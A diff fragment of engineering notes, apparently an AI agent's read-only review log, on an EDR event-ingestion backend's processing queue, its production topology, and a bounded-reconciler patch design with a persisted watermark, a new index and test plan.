+    (ACK boundary), backend/server.py (+31 startup/shutdown), 2 new test files.
+  * PREVIEW RUNTIME OBSERVED (the only runtime the agent can inspect):
+    supervisor program [backend], command
+    /root/.venv/bin/uvicorn server:app --host 0.0.0.0 --port 8001 --workers 1 --reload,
+    directory /app/backend, autostart=true. ONE app process (pid 275) + 2 multiprocessing
+    helper children; SINGLE event loop confirmed. DB = local mongod (supervisor program
+    [mongodb], /usr/bin/mongod --bind_ip_all), MONGO_URL mongodb://localhost:27017,
+    DB_NAME test_database, NIVX_DEPLOYMENT_ENV=preview, edr_raw_events = 274,123 docs,
+    edr_processing_queue DOES NOT EXIST yet. /app is on feature/rc2-alignment, NOT 9273c964.
+  * ⚠ RETRACTED - MY EARLIER P0 CLAIM WAS WRONG. I claimed processing_queue.ensure_indexes()
+    would be skipped because `_ensure_raw_indexes` fails. PROOF IT IS NOT SKIPPED:
+    in 9273c964 server.py the try block runs
+      926  await _ensure_raw_indexes(_raw_db)
+      927-929  await _ensure_processing_queue_indexes(_raw_db)   <-- runs HERE
+      989-992  v2_shadow_observations.create_index(name="obs_device_identity_facts",
+               sparse=True)                                     <-- THIS is the thrower
+      999-1000 except -> log.warning("[startup] edr_raw_events indexes failed: ...")
+    The except message NAMES edr_raw_events but labels the WHOLE block; the raising
+    statement is 989, which is AFTER the queue indexes. Proof the thrower cannot be line
+    926: edr_plane/raw_events.py has COLLECTION = "edr_raw_events" and never touches
+    v2_shadow_observations, and the string obs_device_identity_facts exists ONLY at
+    server.py:988-992. Empirically, every index created BEFORE 989 exists in the preview DB
+    (edr_raw_events 8 indexes, obs_device_ts / obs_collector_ts / obs_deviceiid_ts all
+    present), i.e. the block executes up to the thrower. The ONLY statement lost is the
+    success log.info at 997 - nothing operational follows 992. So uniq_tenant_raw WOULD be
+    created and enqueue() idempotency is NOT compromised. P0 CLAIM: NOT CONFIRMED.
+  * The IndexKeySpecsConflict is still a REAL but COSMETIC preview-only defect: an existing
+    obs_device_identity_facts on v2_shadow_observations has no `sparse` flag, so the sparse
+    re-declaration is rejected (code 86). Production shows NO "[startup] ... failed:" lines.
+  * Design review of the new module (read-only): enqueue() is an idempotent
+    $setOnInsert upsert on (tenant_id, raw_id); claim() is an atomic
+    find_one_and_update over PENDING/RETRY plus EXPIRED PROCESSING leases with $inc
+    attempts and sort by created_at; start_workers() clamps worker_count to 1..8 and
+    guarantees one supervisor per PROCESS. Therefore N replicas x 1 worker-set is SAFE
+    (no double-processing), but N replicas means N x worker_count consumers.
+    stop_workers() has a 15s bounded drain on shutdown.
+  * ACK boundary in _ingest_one now: persist raw -> processing_queue.enqueue ->
+    mark_reported -> count RECEIVED, and the synchronous canonical bridge() call is
+    REMOVED from the request path. So a queue-write failure means NO ACK, which is the
+    intended fail-closed behaviour.
+  * PRODUCTION ANSWERS ARE UNKNOWN FROM THIS POD. nivxray.nivxforge.com is the
+    Emergent-deployed production backend; its deployed branch/commit, replica count,
+    worker count, entrypoint, database name and scale-to-zero behaviour are not visible
+    from the preview pod. A read-only deployer inspection was dispatched and returned
+    "queued" (asynchronous), so no production evidence was available in this turn.
+    DO NOT infer production from the repository.
+  * PRODUCTION INSPECTION (deployer agent, read-only, run e8a40ab2, nothing mutated):
+    Kubernetes, cluster target-7, namespace customers-app, 2 PODS, each
+    `uvicorn server:app --workers 1` => 2 processes / 2 event loops. /api/* -> nginx ->
+    127.0.0.1:8001. Frontend via Cloudflare. DB = MANAGED ATLAS
+    "greeting-app-5782-test_database" (NOT the preview local mongod/test_database).
+    EDR startup indexes COMPLETE with no "[startup] ... failed:" lines.
+    Deployed git branch/commit = UNKNOWN (the pipeline builds a source snapshot with no git
+    metadata; image tag = run_id, digest sha256:41a001b5..., build f8fe5481).
+    All EDR-plane env vars present and non-empty. Rollback = Deployment Panel -> Overview ->
+    history, prior images retained, ~1-2 min, no rebuild.
+    TWO REAL PRODUCTION RISKS RAISED: (1) 2 replicas => TWO independent supervisors
+    => 2 x worker_count = 4 concurrent consumers; claim() is atomic so no job is processed
+    twice, but any singleton/scheduled work inside the supervisor would double-fire and
+    needs a DB lock / leader election; (2) production already logs intermittent /health 503s
+    and 1s nginx upstream timeouts on the single event loop - if liveness restarts a pod the
+    supervisor dies with it, so /health must stay non-blocking.
+    UNRELATED, OBSERVED: threatfox 401 + otx pull failures => stale ABUSE_CH_AUTH_KEY /
+    OTX_API_KEY.
+
+- READ-ONLY DESIGN CHECK on 9273c964 for the 2-pod production topology (2026-10-01).
+  Nothing changed/committed/pushed/deployed/restarted/scaled; no Mongo write. HOLD stands.
+  * worker_count=2 is HARDCODED at the server.py call site (not env-driven); with 2 pods
+    that is 4 workers + TWO supervisors. start_workers() clamps 1..8 and is one-per-PROCESS.
+  * FOUR-WORKER SAFETY: worker loop idle_seconds=1.0, so an EMPTY queue costs only ~1
+    atomic find_one_and_update per worker per second (4/s total) and claim() is covered by
+    the claimable_work index. Lease 600s, retry 30s. No correctness problem; the cost is
+    canonical_bridge concurrency, which is now 4-way instead of the previously serial
+    in-request path.
+  * RECONCILER MULTI-POD SAFETY = CORRECT, NO LOCK NEEDED. enqueue() is a
+    $setOnInsert upsert on (tenant_id, raw_id) and uniq_tenant_raw makes a concurrent
+    double-insert fail at the STORAGE layer; the code counts that as already_present. The
+    only penalty for running it in both pods is DUPLICATED COST, not duplicated work.
+  * ⚠ THE REAL BLOCKER IS THE RECONCILER'S SCOPE, NOT THE WORKER COUNT (new finding):
+    pipeline = $match{trust_state:"AUTHENTICATED"} -> $lookup -> $match{job==[]} -> $sort
+    {ingest_time:1} -> $limit -> $project. Measured on the PREVIEW DB:
+      - NO INDEX on trust_state (edr_raw_events has 8 indexes, all tenant_id-prefixed), so
+        the $match is a COLLSCAN of 274,214 docs / 546.6 MB;
+      - 275,500 docs are AUTHENTICATED, and on first start NONE has a job, so ALL of them
+        pass the anti-join into a $sort of FULL documents ($project is AFTER the sort):
+        ~549 MB versus the 100 MB aggregation sort limit, and allowDiskUse is NOT set
+        => QueryExceededMemoryLimitNoDiskUseAllowed (code 292);
+      - the supervisor runs reconcile_missing_jobs() IMMEDIATELY at startup, before its
+        first wait, and catches it with a bare `except Exception: pass` - NO LOG AT ALL, and
+        its {scanned, created, already_present} return value is discarded. So it would fail
+        SILENTLY every 60s in both pods, on the same event loop that production already
+        shows /health 503s and 1s nginx upstream timeouts on.
+      - ingest_time is stored as an ISO STRING, not a BSON date, so a time-window $match
+        would be a string comparison (lexicographic, which is still correct for ISO-8601
+        UTC) - relevant to any bounded-window fix.
+      - INVERSE RISK where the sort DOES fit (a smaller production collection): reconcile
+        would succeed and enqueue EVERY historical authenticated raw event, turning a
+        crash-window repair into a mass re-canonicalisation of the entire history.
+    Production collection size is UNKNOWN (managed Atlas greeting-app-5782-test_database,
+    a different DB from preview); the SHAPE of the defect is identical because it is in the
+    pipeline, not the data.
+  * RECOMMENDED INITIAL CONFIG: worker_count=1 per pod (2 total) for the first
+    KUSHU backlog drain - minimal one-token change at the server.py call site, no new
+    dependency, no leader election, no Redis, no K8s job.
+  * DEPLOYMENT BLOCKER: YES - the reconciler scope/silence, not the worker count.
+
+- BOUNDED-RECONCILER PATCH DESIGN (prepared for review 2026-10-01, NOT applied).
+  Nothing edited/committed/pushed/deployed; no Mongo write. KUSHU stopped, Gate 4 HOLD.
+  * BOUNDARY = a PERSISTED DEPLOYMENT WATERMARK, not a wall-clock window.
+    edr_processing_queue_state doc _id="reconcile_floor" written ONCE with $setOnInsert at
+    the first startup of the new build; every pod/restart READS the same value, so there is
+    no clock-skew divergence and the floor never moves backwards.
+    Effective window = [max(floor, now - lookback), now - settle],
+    lookback 15 min (crash-window repair, survives a pod restart),
+    settle 60 s (do not race an in-flight request that has written raw but not yet the job).
+    WHY "last 10 minutes" ALONE IS WRONG: at deploy time the 10 minutes of raw events
+    ingested immediately BEFORE the rollout are pre-feature - they were ACKed under the old
+    contract and already canonicalised inline - yet they have no queue row, so a pure
+    relative window would mass-enqueue them for re-canonicalisation. The floor excludes
+    them by construction.
+    WHY A PROCESS-START WATERMARK ALONE IS WRONG: if a pod dies between the raw write and
+    the queue write, the replacement process's start time is LATER than the orphan's
+    ingest_time, so the orphan would never be repaired - which is the exact crash window
+    the reconciler exists for. Hence floor (fixed, persisted) AND lookback (relative).
+  * QUERY REDESIGN: the $lookup anti-join and the $sort of FULL documents are DELETED.
+    Because the window is minutes wide, a plain
+    find({trust_state:"AUTHENTICATED", ingest_time:{$gte:lo,$lte:hi}},
+         {_id:0, tenant_id:1, raw_id:1, ingest_time:1}).sort(ingest_time).limit(n)
+    plus a blind idempotent enqueue() per row is strictly correct and cheaper: enqueue's
+    upsert result already distinguishes created vs already_present, so no anti-join is
+    needed at all.
+  * INDEX REQUIRED (new, on edr_raw_events): (trust_state, ingest_time) name
+    "reconcile_window" - equality then range, added to raw_events.ensure_indexes which runs
+    at server.py:926, BEFORE the known v2_shadow_observations thrower at 989. ingest_time is
+    an ISO-8601 UTC STRING, so a lexicographic range is correct and index-supported.
+  * OBSERVABILITY: `except Exception: pass` in _supervisor is replaced by a rate-controlled
+    warning (first failure, then at most 1 in N cycles) and the {scanned, created,
+    already_present} summary is logged when created > 0. No payloads, no credentials.
+  * worker_count 2 -> 1 at the server.py call site (+ the log string). 2 pods => 2 workers.
+  * TEST PLAN: A historical pre-floor events not reconciled; B recent orphan repaired;
+    C existing job not duplicated; D failure surfaces a warning instead of silence;
+    E worker_count is 1 per process; F the 27 existing ACK-boundary tests stay green.
